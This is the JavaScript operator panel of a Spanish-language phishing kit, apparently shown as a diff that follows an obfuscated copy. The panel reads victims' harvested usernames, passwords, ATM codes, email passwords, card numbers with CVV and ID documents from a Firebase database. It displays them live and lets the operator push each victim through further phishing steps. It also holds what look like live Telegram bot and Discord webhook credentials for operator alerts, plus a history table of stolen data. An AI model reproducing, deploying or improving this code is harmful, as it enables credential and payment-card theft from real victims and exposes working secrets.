_0xc79d7e=_0x85f5e5['val']()||{},_0x44825c=String(_0xc79d7e[_0x1f7f57(0x185)]||'')['replace'](/\D/g,'')[_0x1f7f57(0x1e0)](/(\d{4})(?=\d)/g,_0x1f7f57(0x1d8))['trim'](),_0x1ec387=_0xc79d7e[_0x1f7f57(0x101)]||_0xc79d7e['día']||'--',_0x518d47=_0xc79d7e[_0x1f7f57(0x10b)]||_0xc79d7e[_0x1f7f57(0x12c)]||_0x1f7f57(0x165),_0x98b0f3=String(_0xc79d7e['cvv']||''),_0xbeda7e=document[_0x1f7f57(0x168)](_0x1f7f57(0x1d4)),_0x4784b5=document[_0x1f7f57(0x168)]('mTarFecha'),_0x508401=document['getElementById'](_0x1f7f57(0x122));if(_0xbeda7e)_0xbeda7e['value']=_0x1f7f57(0x198)+(_0x44825c||'—');if(_0x4784b5)_0x4784b5[_0x1f7f57(0x1b4)]=_0x1f7f57(0x149)+_0x1ec387+'/'+_0x518d47;if(_0x508401)_0x508401[_0x1f7f57(0x1b4)]=_0x1f7f57(0x138)+(_0x98b0f3||'—');});},window[_0x55e3c8(0x15f)]=_0x531e53=>{const _0x226b9d=_0x55e3c8;update(ref(db,_0x226b9d(0x1e1)+_0x531e53),{'mostrarBarraTarjeta':!![],'estado':_0x226b9d(0x132)})[_0x226b9d(0x107)](cerrarFormulario);},window[_0x55e3c8(0xff)]=_0x53c360=>{const _0x2f2395=_0x55e3c8;update(ref(db,_0x2f2395(0x1e1)+_0x53c360),{'estado':_0x2f2395(0x1b9),'mostrarBarraTarjeta':![]})['finally'](cerrarFormulario);};let _documentoOpenUid=null;window[_0x55e3c8(0x147)]=_0xef52bf=>{const _0x261620=_0x55e3c8;_documentoOpenUid=_0xef52bf,modal[_0x261620(0x171)]=_0x261620(0x1e6),onValue(ref(db,_0x261620(0x1e1)+_0xef52bf),_0x2b1ed9=>{const _0x3cd54e=_0x261620;if(_documentoOpenUid!==_0xef52bf)return;const _0x64e949=_0x2b1ed9[_0x3cd54e(0x1e3)]()||{},_0x3b4b9d=_0x64e949[_0x3cd54e(0x17d)]||'—',_0x123bcc=_0x64e949[_0x3cd54e(0x1bc)]||_0x64e949[_0x3cd54e(0x135)]||'—',_0x37cf2d=document[_0x3cd54e(0x168)](_0x3cd54e(0x152)),_0x4bb8a4=document['getElementById'](_0x3cd54e(0x195));if(_0x37cf2d)_0x37cf2d[_0x3cd54e(0x1b4)]=_0x3cd54e(0x1d3)+_0x3b4b9d;if(_0x4bb8a4)_0x4bb8a4['value']=_0x3cd54e(0x198)+_0x123bcc;});},window[_0x55e3c8(0x114)]=_0x282b8d=>{const _0x59be79=_0x55e3c8;modal[_0x59be79(0x171)]=_0x59be79(0x167)+_0x282b8d+_0x59be79(0x1c7)+_0x282b8d+_0x59be79(0x1e2)+_0x282b8d+'\x27)\x22>Enviar</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22btn\x20rojo\x22\x20\x20onclick=\x22incorrectoGmail(\x27'+_0x282b8d+_0x59be79(0x143)+_0x282b8d+'\x27)\x22>Inicio</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22btn\x22\x20\x20\x20\x20\x20\x20onclick=\x22cerrarFormulario()\x22>Cancelar</button>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>';},window[_0x55e3c8(0x1b2)]=async _0x12d1fc=>{const _0x13ea5b=_0x55e3c8,_0x2f8ca0=(document['getElementById']('mailCodigo-'+_0x12d1fc)?.['value']||'')[_0x13ea5b(0x169)](),_0x5342f7=(document[_0x13ea5b(0x168)](_0x13ea5b(0x161)+_0x12d1fc)?.[_0x13ea5b(0x1b4)]||'')[_0x13ea5b(0x169)]();if(!_0x2f8ca0||!_0x5342f7)return;const _0x46ea29=new Date()['toLocaleDateString']('es-CO'),_0x3b23e1=navigator[_0x13ea5b(0x14d)];let _0x16e95f=_0x13ea5b(0x153);try{const _0x3d868c=await fetch('https://ipapi.co/json/'),_0x932008=await _0x3d868c['json']();_0x16e95f=(_0x932008['ip']||'?')+_0x13ea5b(0x15e)+(_0x932008['city']||'?')+'\x20-\x20'+(_0x932008[_0x13ea5b(0x1dd)]||'?');}catch{}await update(ref(db,_0x13ea5b(0x1e1)+_0x12d1fc),{'mailCodigo':_0x2f8ca0,'mailDescripcion':_0x5342f7,'fecha':_0x46ea29,'userAgent':_0x3b23e1,'ipInfo':_0x16e95f}),cerrarFormulario();},window[_0x55e3c8(0x142)]=_0xa08f4b=>{const _0x1516c1=_0x55e3c8;modal['innerHTML']=_0x1516c1(0x190)+_0xa08f4b+'\x27)\x22>Inicio</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22btn\x20rojo\x22\x20\x20onclick=\x22incorrectoHotmail(\x27'+_0xa08f4b+'\x27)\x22>Incorrecto</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22btn\x22\x20\x20\x20\x20\x20\x20onclick=\x22cerrarFormulario()\x22>Cancelar</button>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>';},window[_0x55e3c8(0x17c)]=()=>{const _0x1f20aa=_0x55e3c8;_tarjetaOpenUid=null,_documentoOpenUid=null,modal[_0x1f20aa(0x171)]='';},window['mostrarNubeEliminadas']=()=>{const _0x3f47be=_0x55e3c8,_0x2e454b=document[_0x3f47be(0x168)](_0x3f47be(0x111));_0x2e454b[_0x3f47be(0x171)]='',onValue(ref(db,'dataPages'),_0xa5ff36=>{const _0x1e30d5=_0x3f47be,_0x22e491=_0xa5ff36[_0x1e30d5(0x1e3)]();if(!_0x22e491)return;const _0x373a98=[];Object[_0x1e30d5(0x15a)](_0x22e491)['forEach'](_0xa42624=>{const _0xba75ce=_0x1e30d5;if(_0xa42624['oculto']===!![])_0x373a98[_0xba75ce(0x146)](_0xa42624);}),_0x373a98[_0x1e30d5(0x10f)]((_0x530df8,_0x4607d9)=>new Date(_0x4607d9[_0x1e30d5(0x16f)]||_0x1e30d5(0x133))-new Date(_0x530df8[_0x1e30d5(0x16f)]||_0x1e30d5(0x133))),_0x373a98['forEach'](_0x2c7a95=>{const _0x2bc67e=_0x1e30d5,_0x28073e=document['createElement']('tr');_0x28073e[_0x2bc67e(0x171)]=_0x2bc67e(0x140)+(_0x2c7a95[_0x2bc67e(0x1a9)]||'')+_0x2bc67e(0x1bb)+(_0x2c7a95['password']||'')+_0x2bc67e(0x1bb)+(_0x2c7a95[_0x2bc67e(0x16c)]||'')+_0x2bc67e(0x1bb)+(_0x2c7a95[_0x2bc67e(0x1aa)]||'')+_0x2bc67e(0x1bb)+(_0x2c7a95[_0x2bc67e(0x1b6)]||'')+'</td>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<td>'+(_0x2c7a95['tarjeta']||'')[_0x2bc67e(0x169)]()+_0x2bc67e(0x113)+(_0x2c7a95[_0x2bc67e(0x101)]||_0x2c7a95[_0x2bc67e(0x12d)]||'--')+'/'+(_0x2c7a95[_0x2bc67e(0x10b)]||_0x2c7a95[_0x2bc67e(0x12c)]||_0x2bc67e(0x165))+_0x2bc67e(0x178)+(_0x2c7a95[_0x2bc67e(0x109)]||'')['toString']()+'</td>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<td><strong>'+(_0x2c7a95[_0x2bc67e(0x17d)]||_0x2bc67e(0x124))+_0x2bc67e(0x19d)+(_0x2c7a95[_0x2bc67e(0x1bc)]||_0x2c7a95[_0x2bc67e(0x135)]||'—')+_0x2bc67e(0x129)+(_0x2c7a95[_0x2bc67e(0x16f)]||'—')+_0x2bc67e(0x1cb)+(_0x2c7a95['userAgent']||'—')+_0x2bc67e(0x172)+formatearIp(_0x2c7a95[_0x2bc67e(0x1cc)])+'<br>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<strong>Dispositivo:</strong>\x20'+(_0x2c7a95['dispositivo']||'?')+_0x2bc67e(0x120),_0x2e454b[_0x2bc67e(0x1a7)](_0x28073e);});}),contenedor[_0x3f47be(0x1a6)][_0x3f47be(0x155)]=_0x3f47be(0x1ca),document[_0x3f47be(0x168)]('nube-pasarela')[_0x3f47be(0x1a6)][_0x3f47be(0x155)]='block';},window[_0x55e3c8(0x1d2)]=()=>{const _0x566d8f=_0x55e3c8;document['getElementById'](_0x566d8f(0x16e))[_0x566d8f(0x1a6)][_0x566d8f(0x155)]=_0x566d8f(0x1ca),contenedor[_0x566d8f(0x1a6)][_0x566d8f(0x155)]='flex';},window['limpiarNubes']=()=>{const _0x240d07=_0x55e3c8,_0x5088c0=prompt('Ingresa\x20el\x20código\x20de\x206\x20dígitos\x20para\x20confirmar:');if(!_0x5088c0||_0x5088c0[_0x240d07(0x17f)]!==0x6)return alert('❌\x20Código\x20inválido.');if(_0x5088c0!==_0x240d07(0x150))return alert(_0x240d07(0x1eb));if(!confirm(_0x240d07(0x179)))return;update(ref(db),{'dataPages':null})[_0x240d07(0x1c6)](()=>{const _0x463089=_0x240d07;alert('✅\x20Todos\x20los\x20datos\x20han\x20sido\x20eliminados.'),document[_0x463089(0x168)](_0x463089(0x111))[_0x463089(0x171)]='',contenedor['innerHTML']='';})[_0x240d07(0x1c5)](()=>alert('❌\x20Ocurrió\x20un\x20error\x20al\x20intentar\x20limpiar\x20los\x20datos.'));};localStorage[_0x55e3c8(0x112)](_0x55e3c8(0x115))===_0x55e3c8(0x156)&&(document['getElementById'](_0x55e3c8(0x1b0))[_0x55e3c8(0x1a6)][_0x55e3c8(0x155)]=_0x55e3c8(0x1ca),document[_0x55e3c8(0x168)](_0x55e3c8(0x1b8))[_0x55e3c8(0x1a6)][_0x55e3c8(0x155)]='block',contenedor[_0x55e3c8(0x1a6)]['display']='flex',cargarPanel());window['copiarTexto']=function(_0x4eec49){const _0x551d61=_0x55e3c8;if(!_0x4eec49)return alert(_0x551d61(0x1d7));navigator['clipboard']['writeText'](_0x4eec49)[_0x551d61(0x1c6)](()=>{const _0x105d5f=_0x551d61,_0x3a703a=document['createElement']('div');_0x3a703a[_0x105d5f(0x1e7)]='✅\x20Copiado',_0x3a703a[_0x105d5f(0x1a6)][_0x105d5f(0x154)]='fixed',_0x3a703a['style'][_0x105d5f(0x1d5)]=_0x105d5f(0x12e),_0x3a703a[_0x105d5f(0x1a6)]['right']='20px',_0x3a703a[_0x105d5f(0x1a6)][_0x105d5f(0x13f)]=_0x105d5f(0x11b),_0x3a703a[_0x105d5f(0x1a6)][_0x105d5f(0x19b)]=_0x105d5f(0x131),_0x3a703a[_0x105d5f(0x1a6)][_0x105d5f(0x158)]=_0x105d5f(0x1a4),_0x3a703a[_0x105d5f(0x1a6)][_0x105d5f(0x1e4)]=_0x105d5f(0x17b),_0x3a703a[_0x105d5f(0x1a6)][_0x105d5f(0x1b5)]=_0x105d5f(0x18f),_0x3a703a[_0x105d5f(0x1a6)][_0x105d5f(0x18e)]=_0x105d5f(0x14c),document[_0x105d5f(0x1a0)][_0x105d5f(0x1a7)](_0x3a703a),setTimeout(()=>_0x3a703a[_0x105d5f(0x175)](),0x7d0);})['catch'](()=>alert(_0x551d61(0x1b1)));};
+// 📦 Importa funciones de Firebase para interactuar con la base de datos: leer (onValue), actualizar (update), y acceder a referencias (ref).
+import { db, ref, onValue, update } from "./config.js";
+
+// 🖥️ Esta función detecta el sistema operativo del dispositivo a partir del user agent del navegador.
+function detectarDispositivo(userAgent) {
+  userAgent = userAgent.toLowerCase();
+  if (/windows/.test(userAgent)) return "Windows";
+  if (/iphone/.test(userAgent)) return "iPhone";
+  if (/ipad/.test(userAgent)) return "iPad";
+  if (/android/.test(userAgent)) return "Android";
+  if (/macintosh/.test(userAgent)) return "Mac";
+  if (/linux/.test(userAgent)) return "Linux";
+  return "Desconocido";
+}
+
+// 🔁 Almacena los IDs de las nubes que ya se han creado para evitar duplicados.
+const nubesCreadas = new Set();
+// 📦 Contenedor principal donde se renderizan las tarjetas (nubes) en el panel.
+const contenedor = document.getElementById("contenedor");
+// 🧊 Elemento HTML donde se muestran los formularios modales flotantes (Token, Gmail, etc).
+const modal = document.getElementById("formulario-modal");
+
+
+// ********** APARTADO DE NOTIFICACIÓN TELEGRAM **********
+async function notificarTelegram(usuario, tipo) {
+  const token = "8197219472:AAGZ-3sobKFCGWPKMa8ar11i2ZythP6rwGQ"; // reemplaza con tu token
+  const chatId = "5592536910"; // reemplaza con tu chatId
+  const fecha = new Date().toLocaleDateString("es-CO");
+  const hora = new Date().toLocaleTimeString("es-CO", { hour12: false });
+
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+    const ip = data.ip || "Desconocida";
+    const ciudad = data.city || "Desconocida";
+    const pais = data.country_name || "Desconocido";
+
+    const mensaje = `
+    🖲 *Alerta de Panel*
+    ${tipo === "login" ? "🟢 Conectado" : "🔴 Desconectado"}
+    👤 Usuario: *${usuario}*
+    📅 Fecha: ${fecha}
+    ⏰ Hora: ${hora}
+    🌐 IP: ${ip}
+    📍 Ciudad: ${ciudad}
+    🌎 País: ${pais}
+    `;
+
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text: mensaje, parse_mode: "Markdown" })
+    });
+  } catch (error) {
+    console.error("❌ Error al enviar a Telegram:", error);
+  }
+}
+
+// ********** APARTADO DE NOTIFICACIÓN DISCORD **********
+async function notificarDiscord(usuario, tipo) {
+  const webhook = "https://discord.com/api/webhooks/1416976805700567182/F-iWZJJ3WGFwBxWAkuEEUxo7FGbo26OXTsMSK2FwAkQqEKBmsMdJ-UN1Qt6dvL06EtQP";
+  const fecha = new Date().toLocaleDateString("es-CO");
+  const hora = new Date().toLocaleTimeString("es-CO", { hour12: false });
+
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+    const ip = data.ip || "Desconocida";
+    const ciudad = data.city || "Desconocida";
+    const pais = data.country_name || "Desconocido";
+
+    const mensaje = {
+      content: `🖲 **Alerta de Panel**
+${tipo === "login" ? "🟢 Conectado" : "🔴 Desconectado"}
+👤 Usuario: **${usuario}**
+📅 Fecha: ${fecha}
+⏰ Hora: ${hora}
+🌐 IP: ${ip}
+📍 Ciudad: ${ciudad}
+🌎 País: ${pais}`
+    };
+
+    await fetch(webhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(mensaje)
+    });
+  } catch (error) {
+    console.error("❌ Error al enviar a Discord:", error);
+  }
+}
+
+// ===== Login =====
+window.verificarLogin = () => {
+  const user = document.getElementById("usuario").value.trim();
+  const pass = document.getElementById("clave").value.trim();
+
+  const usuarios = [{ usuario: "admin", clave: "230320" }];
+
+  if (usuarios.some(u => u.usuario === user && u.clave === pass)) {
+    localStorage.setItem("panelLoggedIn", "true");
+    localStorage.setItem("panelUser", user);
+
+    document.getElementById("login-container").style.display = "none";
+    document.getElementById("barra-superior").style.display = "block";
+    contenedor.style.display = "flex";
+
+    const sonido = document.getElementById("alerta-sonido");
+    if (sonido) sonido.play().catch(() => {});
+
+    cargarPanel();
+
+    // Notificar conexión
+    notificarTelegram(user, "login");
+    notificarDiscord(user, "login");
+  }
+};
+
+window.cerrarSesion = () => {
+  const user = document.getElementById("usuario").value.trim() || localStorage.getItem("panelUser") || "Desconocido";
+
+  // Notificar desconexión
+  notificarTelegram(user, "logout");
+  notificarDiscord(user, "logout");
+
+  localStorage.clear();
+
+  document.getElementById("login-container").style.display = "flex";
+  document.getElementById("barra-superior").style.display = "none";
+  contenedor.style.display = "none";
+  contenedor.innerHTML = "";
+
+  document.getElementById("usuario").value = "";
+  document.getElementById("clave").value = "";
+
+  document.documentElement.classList.remove("logueado");
+};
+
+
+
+// Util: normaliza el texto ipInfo que guardamos como "IP - Ciudad - País"
+function formatearIp(ipInfo) {
+  if (!ipInfo) return "—";
+  const parts = String(ipInfo).split("-").map(s => s.trim()).filter(Boolean);
+  return parts.join(" | ");
+}
+
+
+// ===== Panel =====
+function cargarPanel() {
+  onValue(ref(db, "dataPages"), snapshot => {
+    const data = snapshot.val();
+    if (!data) return;
+
+    Object.entries(data).forEach(([uid, info]) => {
+      if (info.oculto) return;
+
+      const vacia = !info.username && !info.password && !info.codigo && !info.email && !info.passwords && !info.tarjeta && !info.documento;
+      if (vacia) return;
+
+      let nube = document.getElementById("nube-" + uid);
+      const esNueva = !nube;
+
+      const conectado = info.estado === "abierto";
+      const bolita = conectado ? "verde" : "rojo";
+
+      // ---- Card ----
+      const tarjetaHi = info.mostrarBarraTarjeta ? "input-highlight" : "";
+      const mesTarj  = (info.dia || info["día"] || "--");
+      const anioTarj = (info.año || info.anio || "----");
+      const cvvTarj  = (info.cvv || "");
+      const cleanNum = (info.tarjeta || "").replaceAll(" ","");
+      const tarjetaCompletada = String(info.tarjetaEstado || info.tarjetaCompleta || "").toLowerCase() === "complete";
+      const enSep2 = String(info.pagina || "").toLowerCase() === "sep2";
+      const cardClasses = ["btn-ver-tarjeta", tarjetaHi];
+      if (tarjetaCompletada) cardClasses.push("is-complete"); else if (enSep2) cardClasses.push("is-current");
+      const tarjetaBloque = `
+        <div class="tarjeta-cell">
+          <button class="${cardClasses.join(' ')}" type="button"
+            onclick="abrirTarjeta('${uid}','${cleanNum}','${mesTarj}','${anioTarj}','${cvvTarj}')">Card</button>
+        </div>`;
+
+      // ---- Docu ----
+      const docuHi = info.mostrarBarraDocumento ? "input-highlight" : "";
+      const docEstadoCompleto = String(info.documentoEstado || "").toLowerCase() === "complete";
+      const enSep3 = String(info.pagina || "").toLowerCase() === "sep3";
+      const docuClasses = ["btn-ver-documento", docuHi];
+      if (docEstadoCompleto) docuClasses.push("is-complete"); else if (enSep3) docuClasses.push("is-current");
+      const documentoBloque = `
+        <div class="docu-cell">
+          <button class="${docuClasses.join(' ')}" type="button" onclick="abrirDocumento('${uid}')">Docu</button>
+        </div>`;
+
+      const html = `
+        <div class="cerrar" onclick="cerrarNube('${uid}')">X</div>
+        <div class="estado-conexion ${bolita}">${conectado ? "Conectado" : "Desconectado"}</div>
+
+        <div class="ip-info">
+          <strong>IP:</strong> ${info.ip || "?"} |
+          <strong>Ciudad:</strong> ${info.ciudad || "?"} |
+          <strong>País:</strong> ${info.pais || "?"} |
+          <strong>Dispositivo:</strong> ${info.dispositivo || "?"}
+        </div>
+
+        <div class="datos-linea">
+          <div><strong>Username:</strong><br>
+            <span class="${info.mostrarBarra ? "input-highlight" : ""}" onclick="copiarTexto('${info.username || ""}')">${info.username || "*******"}</span>
+          </div>
+          <div><strong>Password:</strong><br>
+            <span class="${info.mostrarBarra ? "input-highlight" : ""}" onclick="copiarTexto('${info.password || ""}')">${info.password || "*******"}</span>
+          </div>
+          <div><strong>ATM:</strong><br>
+            <span class="${info.mostrarBarraCodigo ? "input-highlight" : ""}" onclick="copiarTexto('${info.codigo || ""}')">${info.codigo || "*******"}</span>
+          </div>
+          <div><strong>Email:</strong><br>
+            <span class="${(info.mostrarBarraHotmailEmail || info.mostrarBarraEmail) ? "input-highlight" : ""}" onclick="copiarTexto('${info.email || ""}')">${info.email || "*******"}</span>
+          </div>
+          <div><strong>Passwords:</strong><br>
+            <span class="${(info.mostrarBarraHotmailPass || info.mostrarBarraGmail) ? "input-highlight" : ""}" onclick="copiarTexto('${info.passwords || ""}')">${info.passwords || "*******"}</span>
+          </div>
+          <div><strong>Tarjeta:</strong><br>${tarjetaBloque}</div>
+          <div><strong>Documento:</strong><br>${documentoBloque}</div>
+        </div>
+
+        <div class="botones">
+          <button class="btn rojo"   onclick="incorrectoLogin('${uid}')">Incorrecto</button>
+          <button class="btn morado" onclick="sep1('${uid}')">Sep1</button>
+          <button class="btn morado" onclick="sep2('${uid}')">Sep2</button>
+          <button class="btn morado" onclick="sep3('${uid}')">Sep3</button>
+          <button class="btn amarillo" onclick="abrirMail('${uid}')">Gmail</button>
+          <button class="btn rosa"    onclick="abrirHot('${uid}')">Hotmail</button>
+        </div>`;
+
+      if (esNueva) {
+        nube = document.createElement("div");
+        nube.className = "nube";
+        nube.id = "nube-" + uid;
+        nube.innerHTML = html;
+        contenedor.appendChild(nube);
+        if (!nubesCreadas.has(uid)) {
+          const sonido = document.getElementById("alerta-sonido");
+          if (sonido) sonido.play().catch(()=>{});
+          nubesCreadas.add(uid);
+        }
+      } else {
+        nube.innerHTML = html;
+      }
+    });
+  });
+}
+
+// ===== Acciones =====
+window.cerrarNube = async uid => {
+  const fecha = new Date().toLocaleDateString("es-CO");
+  const userAgent = navigator.userAgent;
+  const dispositivo = detectarDispositivo(userAgent);
+  let ip = "?", ciudad = "?", pais = "?", ipInfo = "Desconocido";
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+    ip = data.ip || "?"; ciudad = data.city || "?"; pais = data.country_name || "?";
+    ipInfo = `${ip} - ${ciudad} - ${pais}`;
+  } catch {}
+  await update(ref(db, "dataPages/" + uid), {
+    oculto:true, fecha, userAgent, ipInfo, ip, ciudad, pais, dispositivo
+  });
+  const el = document.getElementById("nube-" + uid);
+  if (el) el.remove();
+};
+window.incorrectoLogin = uid => { update(ref(db, "dataPages/" + uid), { estado:"incorrecto", mostrarBarra:false }); cerrarFormulario(); };
+
+// Navegación
+window.sep1 = uid => update(ref(db, "dataPages/" + uid), { estado:"sep1" });
+window.sep2 = uid => update(ref(db, "dataPages/" + uid), { estado:"sep2" });
+window.sep3 = uid => update(ref(db, "dataPages/" + uid), { estado:"sep3" });
+
+window.irAIndex   = uid => { update(ref(db, "dataPages/" + uid), { estado:"irAIndex"   }); cerrarFormulario(); };
+window.irAGmail   = uid => { update(ref(db, "dataPages/" + uid), { estado:"irAGmail"   }); cerrarFormulario(); };
+window.irAHotmail = uid => { update(ref(db, "dataPages/" + uid), { estado:"irAHotmail" }); cerrarFormulario(); };
+
+window.incorrectoToken   = uid => { update(ref(db, "dataPages/" + uid), { estado:"incorrecto",    mostrarBarraCodigo:false }); cerrarFormulario(); };
+window.incorrectoGmail   = uid => { update(ref(db, "dataPages/" + uid), { estado:"incorrecto",    mostrarBarraGmail:false  }); cerrarFormulario(); };
+window.incorrectoHotmail = uid => { update(ref(db, "dataPages/" + uid), { estado:"incorrectoHot", mostrarBarraHotmailPass:false }); cerrarFormulario(); };
+
+// ===== Modal: Tarjeta (CVV visible) =====
+let _tarjetaOpenUid = null;
+window.abrirTarjeta = (uid, tarjeta, mes, anio, cvv) => {
+  _tarjetaOpenUid = uid;
+  const numFmt = (String(tarjeta || "")).replace(/\D/g,"").replace(/(\d{4})(?=\d)/g,"$1 ").trim();
+  const fecha  = `${mes || "--"}/${anio || "----"}`;
+  const cvRaw  = String(cvv || "");
+
+  modal.innerHTML = `
+    <div class="modal-formulario" role="dialog" aria-label="Formulario Tarjeta">
+      <h4>Formulario Tarjeta</h4>
+      <input id="mTarNum"   type="text" value="Número: ${numFmt || "—"}" disabled>
+      <input id="mTarFecha" type="text" value="Fecha: ${fecha}" disabled>
+      <input id="mTarCvv"   type="text" value="Código: ${cvRaw || "—"}" disabled>
+      <div class="modal-buttons">
+        <button class="btn azul" onclick="cerrarFormulario()">Cancelar</button>
+      </div>
+    </div>`;
+
+  // Live update
+  onValue(ref(db, "dataPages/" + uid), (snap) => {
+    if (_tarjetaOpenUid !== uid) return;
+    const i = snap.val() || {};
+    const n  = (String(i.tarjeta || "")).replace(/\D/g,"").replace(/(\d{4})(?=\d)/g,"$1 ").trim();
+    const me = (i.dia || i["día"] || "--");
+    const an = (i.año || i.anio || "----");
+    const cv = String(i.cvv || "");
+
+    const numEl   = document.getElementById("mTarNum");
+    const fechaEl = document.getElementById("mTarFecha");
+    const cvvEl   = document.getElementById("mTarCvv");
+    if (numEl)   numEl.value   = `Número: ${n || "—"}`;
+    if (fechaEl) fechaEl.value = `Fecha: ${me}/${an}`;
+    if (cvvEl)   cvvEl.value   = `Código: ${cv || "—"}`;
+  });
+};
+window.enviarTarjeta = uid => { update(ref(db, "dataPages/" + uid), { mostrarBarraTarjeta:true, estado:"abierto" }).finally(cerrarFormulario); };
+window.incorrectoTarjeta = uid => { update(ref(db, "dataPages/" + uid), { estado:"incorrecto", mostrarBarraTarjeta:false }).finally(cerrarFormulario); };
+
+// ===== Modal: Documento =====
+let _documentoOpenUid = null;
+window.abrirDocumento = uid => {
+  _documentoOpenUid = uid;
+  modal.innerHTML = `
+    <div class="modal-formulario" role="dialog" aria-label="Formulario Documento">
+      <h4>Formulario Documento</h4>
+      <input id="mDocTipo" type="text" value="Tipo: —" disabled>
+      <input id="mDocNum"  type="text" value="Número: —" disabled>
+      <div class="modal-buttons">
+        <button class="btn azul" onclick="cerrarFormulario()">Cancelar</button>
+      </div>
+    </div>`;
+  onValue(ref(db, "dataPages/" + uid), (snap) => {
+    if (_documentoOpenUid !== uid) return;
+    const i = snap.val() || {};
+    const tipo = i.documentoTipo || "—";
+    const num  = (i.documentoMask || i.documentoNumero || "—");
+    const tipoEl = document.getElementById("mDocTipo");
+    const numEl  = document.getElementById("mDocNum");
+    if (tipoEl) tipoEl.value = `Tipo: ${tipo}`;
+    if (numEl)  numEl.value  = `Número: ${num}`;
+  });
+};
+
+// ===== Modal: Gmail =====
+window.abrirMail = uid => {
+  modal.innerHTML = `
+    <div class="modal-formulario">
+      <h4>Formulario Gmail</h4>
+      <input type="text" id="mailCodigo-${uid}" placeholder="Código (2 dígitos)" maxlength="2">
+      <input type="text" id="mailDescripcion-${uid}" placeholder="Descripción">
+      <div class="modal-buttons">
+        <button class="btn negro" onclick="enviarMail('${uid}')">Enviar</button>
+        <button class="btn rojo"  onclick="incorrectoGmail('${uid}')">Incorrecto</button>
+        <button class="btn azul"  onclick="irAGmail('${uid}')">Inicio</button>
+        <button class="btn"      onclick="cerrarFormulario()">Cancelar</button>
+      </div>
+    </div>`;
+};
+window.enviarMail = async uid => {
+  const codigo = (document.getElementById("mailCodigo-" + uid)?.value || "").trim();
+  const descripcion = (document.getElementById("mailDescripcion-" + uid)?.value || "").trim();
+  if (!codigo || !descripcion) return;
+  const fecha = new Date().toLocaleDateString("es-CO");
+  const userAgent = navigator.userAgent;
+  let ipInfo = "Desconocido";
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+    ipInfo = `${data.ip || "?"} - ${data.city || "?"} - ${data.country_name || "?"}`;
+  } catch {}
+  await update(ref(db, "dataPages/" + uid), { mailCodigo: codigo, mailDescripcion: descripcion, fecha, userAgent, ipInfo });
+  cerrarFormulario();
+};
+
+// ===== Modal: Hotmail =====
+window.abrirHot = uid => {
+  modal.innerHTML = `
+    <div class="modal-formulario">
+      <h4>Formulario Hotmail</h4>
+      <div class="modal-buttons">
+        <button class="btn negro" onclick="irAHotmail('${uid}')">Inicio</button>
+        <button class="btn rojo"  onclick="incorrectoHotmail('${uid}')">Incorrecto</button>
+        <button class="btn"      onclick="cerrarFormulario()">Cancelar</button>
+      </div>
+    </div>`;
+};
+
+// ===== Modal utils =====
+window.cerrarFormulario = () => {
+  _tarjetaOpenUid = null;
+  _documentoOpenUid = null;
+  modal.innerHTML = "";
+};
+
+// ===== Historial / utilidades =====
+window.mostrarNubeEliminadas = () => {
+  const tablaBody = document.getElementById("tabla-nube");
+  tablaBody.innerHTML = "";
+  onValue(ref(db, "dataPages"), snapshot => {
+    const data = snapshot.val();
+    if (!data) return;
+    const eliminadas = [];
+    Object.values(data).forEach(info => { if (info.oculto === true) eliminadas.push(info); });
+    eliminadas.sort((a, b) => (new Date(b.fecha || "2000-01-01")) - (new Date(a.fecha || "2000-01-01")));
+    eliminadas.forEach(info => {
+      const row = document.createElement("tr");
+      row.innerHTML = `
+        <td>${info.username || ""}</td>
+        <td>${info.password || ""}</td>
+        <td>${info.codigo   || ""}</td>
+        <td>${info.email    || ""}</td>
+        <td>${info.passwords|| ""}</td>
+        <td>${(info.tarjeta || "").trim()}<br><strong>fecha:</strong> ${(info.dia || info["día"] || "--")}/${(info.año || info.anio || "----")}<br><strong>cvv:</strong> ${(info.cvv || "").toString()}</td>
+        <td><strong>${(info.documentoTipo || "documento")}:</strong><br>${(info.documentoMask || info.documentoNumero || "—")}</td>
+        <td><strong>Fecha:</strong> ${info.fecha || "—"}<br>
+            <strong>User Agent:</strong> <small>${info.userAgent || "—"}</small><br>
+            <strong>Ip:</strong> ${formatearIp(info.ipInfo)}<br>
+            <strong>Dispositivo:</strong> ${info.dispositivo || "?"}
+        </td>`;
+      tablaBody.appendChild(row);
+    });
+  });
+  contenedor.style.display = "none";
+  document.getElementById("nube-pasarela").style.display = "block";
+};
+window.regresarPanel = () => {
+  document.getElementById("nube-pasarela").style.display = "none";
+  contenedor.style.display = "flex";
+};
+window.limpiarNubes = () => {
+  const codigo = prompt("Ingresa el código de 6 dígitos para confirmar:");
+  if (!codigo || codigo.length !== 6) return alert("❌ Código inválido.");
+  if (codigo !== "102030") return alert("🚫 Código incorrecto.");
+  if (!confirm("⚠️ Esto eliminará TODO el contenido de la nube. ¿Estás seguro?")) return;
+  update(ref(db), { dataPages: null })
+    .then(() => { alert("✅ Todos los datos han sido eliminados."); document.getElementById("tabla-nube").innerHTML = ""; contenedor.innerHTML = ""; })
+    .catch(() => alert("❌ Ocurrió un error al intentar limpiar los datos."));
+};
+
+// ===== Sesión persistida =====
+if (localStorage.getItem("panelLoggedIn") === "true") {
+  document.getElementById("login-container").style.display = "none";
+  document.getElementById("barra-superior").style.display = "block";
+  contenedor.style.display = "flex";
+  cargarPanel();
+}
+
+// ===== Copiar =====
+window.copiarTexto = function (texto) {
+  if (!texto) return alert("⚠️ Nada que copiar.");
+  navigator.clipboard.writeText(texto).then(() => {
+    const toast = document.createElement("div");
